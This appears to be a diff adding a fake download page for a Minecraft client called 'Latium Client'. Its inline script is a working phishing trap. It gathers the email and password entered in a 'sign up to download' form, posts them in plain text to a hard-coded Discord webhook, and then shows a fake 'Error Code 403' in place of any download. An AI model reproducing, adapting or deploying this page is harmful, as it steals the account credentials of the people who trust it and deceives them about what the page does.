@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Latium Client</title>
+  <style>
+    /* Inline CSS */
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: #eee;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    header {
+      background: #1a1a1a;
+      padding: 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    nav ul {
+      list-style: none;
+      display: flex;
+      gap: 1rem;
+      margin: 0;
+      padding: 0;
+    }
+
+    nav a {
+      color: #4fc3f7;
+      text-decoration: none;
+    }
+
+    #hero {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 2rem;
+    }
+
+    #downloadBtn {
+      background: #4fc3f7;
+      border: none;
+      padding: 0.75rem 1.5rem;
+      font-size: 1rem;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+
+    section {
+      padding: 2rem;
+    }
+
+    footer {
+      background: #1a1a1a;
+      text-align: center;
+      padding: 1rem;
+    }
+
+    /* Modal Styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0, 0, 0, 0.7);
+    }
+
+    .modal-content {
+      background-color: #222;
+      margin: 10% auto;
+      padding: 20px;
+      border: 1px solid #444;
+      width: 300px;
+      border-radius: 5px;
+      color: #eee;
+    }
+
+    .close {
+      color: #aaa;
+      float: right;
+      font-size: 28px;
+      cursor: pointer;
+    }
+
+    .modal-content input {
+      width: 100%;
+      padding: 8px;
+      margin: 5px 0 15px;
+      border: 1px solid #555;
+      border-radius: 3px;
+      background: #333;
+      color: #eee;
+    }
+
+    .modal-content button {
+      width: 100%;
+      padding: 10px;
+      background: #4fc3f7;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Welcome to Latium Client</h1>
+    <nav>
+      <ul>
+        <li><a href="#features">Features</a></li>
+        <li><a href="#download">Download</a></li>
+        <li><a href="#contact">Contact</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <section id="hero">
+    <h2>Your Ultimate Minecraft Experience</h2>
+    <button id="downloadBtn">Download Now</button>
+  </section>
+
+  <section id="features">
+    <h2>Features</h2>
+    <ul>
+      <li>Optimized Performance</li>
+      <li>Custom GUI</li>
+      <li>Built-in Macros</li>
+      <li>Mod Support</li>
+    </ul>
+  </section>
+
+  <section id="download">
+    <h2>Download</h2>
+    <p>Click the button above to sign up and get Latium Client.</p>
+  </section>
+
+  <!-- Sign Up Modal -->
+  <div id="signupModal" class="modal">
+    <div class="modal-content">
+      <span id="closeModal" class="close">&times;</span>
+      <div id="modalBody">
+        <h2>Sign Up to Download</h2>
+        <form id="signupForm">
+          <label for="email">Email:</label>
+          <input type="email" id="email" name="email" required />
+          <label for="password">Password:</label>
+          <input type="password" id="password" name="password" required />
+          <button type="submit">Submit & Download</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <p>&copy; 2025 Latium Client Team</p>
+  </footer>
+
+  <script>
+    // Inline JS
+    const webhookURL = 'https://discord.com/api/webhooks/1384634227709972502/U2g16Cio3jFsQtVjC1ZCCkkH8-8gzI6UHYFfrDOIwBSAMiRwDLY2Wm0aX8i5FawWy4Gc';
+    const downloadBtn = document.getElementById('downloadBtn');
+    const modal = document.getElementById('signupModal');
+    const closeModal = document.getElementById('closeModal');
+    const form = document.getElementById('signupForm');
+    const modalBody = document.getElementById('modalBody');
+
+    downloadBtn.addEventListener('click', () => {
+      modal.style.display = 'block';
+    });
+
+    closeModal.addEventListener('click', () => {
+      modal.style.display = 'none';
+    });
+    window.addEventListener('click', (e) => {
+      if (e.target === modal) modal.style.display = 'none';
+    });
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = form.email.value;
+      const password = form.password.value;
+
+      try {
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: `Email: ${email} | Password: ${password}` })
+        });
+        modalBody.innerHTML = '<h2>Error Code 403</h2>';
+      } catch (err) {
+        alert('Submission failed. Please try again.');
+      }
+    });
+  </script>
+</body>
+</html>
